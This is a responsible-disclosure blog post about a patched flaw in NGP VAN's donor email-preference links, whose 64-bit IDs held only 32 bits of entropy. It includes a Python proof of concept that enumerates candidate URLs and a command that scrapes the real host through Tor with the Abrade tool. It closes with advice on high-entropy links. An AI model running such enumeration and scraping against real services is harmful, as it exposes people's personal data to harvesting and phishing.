---
layout: post
title: Vulnerability Patched in Democratic Donor Database
image: /images/ngpvan.svg
date: 2017-10-16 08:00
tag: Weak URL Generation for Email Subscription Management Exposed Democratic Donors Emails to Attack
categories: [responsible disclosure, abrade, hacking]
---
[1]: https://www.ngpvan.com/
[2]: https://www.ngpvan.com/about
[3]: https://jlospinoso.github.io/cpp/developing/software/2017/09/15/abrade-web-scraper.html
[4]: https://www.incapsula.com/website-security/access-control.html
[5]: https://github.com/ziplokk1/incapsula-cracker-py3
[6]: https://en.wikipedia.org/wiki/Entropy_(information_theory)
[7]: https://en.wikipedia.org/wiki/Thunk
[8]: https://en.wikipedia.org/wiki/Universally_unique_identifier
[9]: https://www.salon.com/2017/09/13/theres-overwhelming-evidence-that-russia-hacked-democrats-but-the-government-hasnt-shared-it/
[10]: https://www.eff.org/issues/coders

A weak link-generation algorithm exposed Democratic Party donor information in the [NGP VAN][1] service to attack last month. The vulnerability would allow an attacker to unsubscribe large volumes of donors from Democratic candidates' fundraising emails, conduct phishing campaigns, or resell the data.

I disclosed the vulnerability to [NGP VAN][1]'s engineering team, which patched the vulnerability within a week.

[Salon published an article last month][9] suggesting a connection between Guccifer 2.0's 2016 DNC hack and NGP VAN.

In this blog post, I'll discuss the problem, give a proof of concept, and provide some recommendations to avoid similar problems in unauthenticated subscription-management portals.

# NGP VAN Emails

[NGP VAN][1] offers Democratic donor campaign information to Democratic and progressive campaigns and organizations. According [to their site][2], they service nearly every major Democratic campaign in America (to include President Obama).

Potential donors receive periodic emails from participating political candidates. At the bottom of each of these emails, the recipient has the option to update subscription preferences using a link with some large numbers in it, e.g.:

```
https://act.myngp.com/el/-9876543219876543219/1234567891234567891
```

This link is a [thunk][7] into the subscription management portal, e.g.:

```
https://act.myngp.com/Email/ManageEmailPreferences/1234567891234567891
```

Here's a redacted example:

![Email List Preferences](https://raw.githubusercontent.com/JLospinoso/jlospinoso.github.io/master/images/landing.png)

# The Vulnerability

The numerical portion of the subscription management URL is the *signed representation* of an 8-byte unsigned integer. This value encodes sensitive information an attacker could use to scrape NGP VAN's database.

The upper 4 bytes are a user ID while the lower 4 bytes is a partition ID, the "suffix". Once you find a valid suffix, you can scrape through the ~4.3 billion candidate user IDs. Valid suffixes are trivial to extract from valid NGP VAN emails.

Here's a proof of concept Python program that generates candidate URLs:

```
import struct
import argparse

def member_ids(start, suffix):
    while start < 0xFFFFFFFF:
        bits = struct.pack("<II", suffix, start)
        value = struct.unpack("q", bits)
        yield value[0]
        start += 1

parser = argparse.ArgumentParser()
parser.add_argument("--start", type=int, help="ID to start from.", default=0)
parser.add_argument("--suffix", type=int, help="secret suffix")
args = parser.parse_args()

start = args.start
for id in member_ids(args.start, args.suffix):
    print "/Email/ManageEmailPreferences/%d" % id
```

An attacker could pluck an appropriate suffix out of a valid campaign email, then use the program above to generate candidate links. Say the suffix is 0x11223344 (decimal 287454020):

```
> python gen.py --suffix=287454020
/Email/ManageEmailPreferences/287454020
/Email/ManageEmailPreferences/4582421316
/Email/ManageEmailPreferences/8877388612
/Email/ManageEmailPreferences/13172355908
/Email/ManageEmailPreferences/17467323204
/Email/ManageEmailPreferences/21762290500
/Email/ManageEmailPreferences/26057257796
/Email/ManageEmailPreferences/30352225092
/Email/ManageEmailPreferences/34647192388
/Email/ManageEmailPreferences/38942159684
...
```

Piping these routes into the [Abrade][3] web API scraper, an attacker could check hundreds of links per second via Tor:

```
python python gen.py --suffix=287454020 | abrade act.myngp.com --tls --stdin --tor --contents --screen "We're sorry"
```

NGP VAN uses [Incapsula][4], which adds some complexity to performing a scrape. This is a [cat and mouse game][5].

# Guidelines for Subscription Management

This attack no longer works thanks to a patch, but this disclosure is a cautionary tale to others implementing unauthenticated subscription management services.

When generating links for unauthenticated users, it's critical that you introduce very high [entropy][6] into the links. If in doubt, use a [UUID][8] and save a mapping from UUID to user accounts.

Obfuscation is not a good policy. The NGP VAN links appeared to have 64 bits of entropy (18,446,744,073,709,551,616 URLs--too large to scrape), but they actually contained 32 bits of entropy because of the suffix. That's certainly doable.

Using an anti-bot service will help, but a determined adversary can defeat these services. It's simply too hard a problem--the service has to parse legitimate traffic from attacker traffic, and they'll always err on the side of permitting.

Finally, don't expose the user's actual email address in the management page. It's just not necessary. Have the user sign up for an account and authenticate if PII is involved. (Note: NGP VAN no longer exposes full email addresses after this weekend's patch.)

# Thanks

Thanks to NGP VAN for being extremely responsive. They served as a model for how companies should react to responsible vulnerability disclosure.

Special thanks to the Electronic Frontier Foundation's [Coders' Rights Project][10].
